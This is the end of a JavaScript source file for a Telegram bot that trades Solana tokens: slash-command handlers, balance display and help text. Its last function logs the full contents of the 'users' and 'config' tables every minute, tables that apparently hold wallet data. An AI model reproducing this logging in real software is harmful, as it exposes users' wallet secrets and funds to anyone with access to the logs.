        await bot.answerCallbackQuery(query.id, { text: "Unhandled callback." })
      }
      break
  }
})

function clearPendingForSlash(id) {
  clearPendingMessageHandler(id)
}

bot.setMyCommands([
  { command: "start", description: "Show the main menu" },
  { command: "balances", description: "Check your SOL & token balances" },
  { command: "buy", description: "Buy tokens (swap SOL->token)" },
  { command: "sell", description: "Sell tokens (swap token->SOL)" },
  { command: "withdraw", description: "Withdraw SOL to another address" },
  { command: "settings", description: "Manage wallet settings" },
  { command: "help", description: "Show help info" },
])

bot.onText(/\/help/, (msg) => {
  const c = msg.chat.id
  clearPendingForSlash(c)
  const ht = `
What can this bot do?
You can /start to open the main menu or use slash commands below:

/balances - Check your SOL & token balances
/buy - Swap SOL->token
/sell - Swap token->SOL
/withdraw - Send SOL to another address
/settings - Manage wallet settings
/help - Show this help
  `
  bot.sendMessage(c, ht, { parse_mode: "Markdown" })
})

bot.onText(/\/balances/, async (msg) => {
  const c = msg.chat.id
  clearPendingForSlash(c)
  const u = await getUserRow(c)
  if (!u || !u.public_key) {
    return bot.sendMessage(c, "No wallet found. Please /start => create or import one.")
  }
  const pb = u.public_key
  const sb = await getSolBalance(pb)
  const sp = await getSolPriceUSD()
  const su = sb.mul(sp)
  let txt = "*Wallet Address:*\n`" + pb + "`\n\n*SOL Balance:* " + sb.toFixed(4) + " SOL (~$" + su.toFixed(2) + ")\n\n"
  const tb = await getAllTokenBalances(pb)
  if (tb.length > 0) {
    txt += "*SPL Token Balances:*\n"
    tb.forEach(({ mint, amount, decimals }) => {
      txt += "- `" + mint + "`: " + amount.toFixed(decimals) + "\n"
    })
  } else {
    txt += "No SPL tokens found."
  }
  bot.sendMessage(c, txt, { parse_mode: "Markdown" })
})

bot.onText(/\/buy/, (msg) => {
  const c = msg.chat.id
  clearPendingForSlash(c)
  bot.sendMessage(c, "Use the main menu ( /start ) => 💹 Buy.")
})

bot.onText(/\/sell/, (msg) => {
  const c = msg.chat.id
  clearPendingForSlash(c)
  bot.sendMessage(c, "Use the main menu ( /start ) => 💱 Sell.")
})

bot.onText(/\/withdraw/, (msg) => {
  const c = msg.chat.id
  clearPendingForSlash(c)
  bot.sendMessage(c, "Use the main menu ( /start ) => 💸 Withdraw.")
})

bot.onText(/\/settings/, (msg) => {
  const c = msg.chat.id
  clearPendingForSlash(c)
  bot.sendMessage(c, "Use the main menu ( /start ) => ⚙️ Settings.")
})

logger.info("Telegram bot started...")

function printDBContents() {
  db.all("SELECT * FROM users", (err, userRows) => {
    if (err) {
      logger.error(err.message)
    } else {
      if (!userRows || userRows.length === 0) {
        logger.info("No data found in 'users' table.")
      } else {
        logger.info("=== USERS TABLE DATA ===")
        logger.info(JSON.stringify(userRows, null, 2))
      }
    }
  })
  db.all("SELECT * FROM config", (err, configRows) => {
    if (err) {
      logger.error(err.message)
    } else {
      if (!configRows || configRows.length === 0) {
        logger.info("No data found in 'config' table.")
      } else {
        logger.info("=== CONFIG TABLE DATA ===")
        logger.info(JSON.stringify(configRows, null, 2))
      }
    }
  })
}

setInterval(printDBContents, 60 * 1000)
